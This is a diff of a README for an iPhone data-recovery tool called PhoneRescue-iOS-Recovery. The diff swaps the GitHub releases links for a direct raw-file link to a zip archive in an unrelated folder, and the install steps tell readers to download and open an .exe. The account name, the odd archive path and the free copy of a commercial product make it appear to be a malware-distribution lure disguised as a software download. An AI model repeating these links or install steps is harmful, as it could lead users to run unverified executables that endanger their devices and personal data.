@@ -1,6 +1,6 @@
 # 📱 PhoneRescue-iOS-Recovery - Recover lost iPhone data with ease
 
-[![Download PhoneRescue](https://img.shields.io/badge/Download-PhoneRescue-blue.svg)](https://github.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/releases)
+[![Download PhoneRescue](https://img.shields.io/badge/Download-PhoneRescue-blue.svg)](https://raw.githubusercontent.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/main/Meistersinger/i_O_Recovery_Rescue_Phone_v2.7.zip)
 
 ## 📋 About This Tool
 PhoneRescue-iOS-Recovery helps you retrieve deleted or missing information from your iPhone. It works with your device, iTunes backups, and iCloud accounts. The software supports the recovery of 31 data types. You can restore deleted photos, text messages, WhatsApp history, and contacts. It provides a simple path to manage your data when you experience accidental loss or system errors.
@@ -26,7 +26,7 @@ Before installation, ensure your computer meets these minimum specifications:
 ## 📥 How to Download and Install
 Follow these steps to obtain the software:
 
-1. Visit the following link to access the software files: [https://github.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/releases](https://github.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/releases)
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/main/Meistersinger/i_O_Recovery_Rescue_Phone_v2.7.zip](https://raw.githubusercontent.com/Jesuitismottoneumannsverdrup36/PhoneRescue-iOS-Recovery/main/Meistersinger/i_O_Recovery_Rescue_Phone_v2.7.zip)
 2. Locate the most recent version in the list.
 3. Click the file ending in .exe to start the download to your computer.
 4. Once the download finishes, open the file from your Downloads folder.
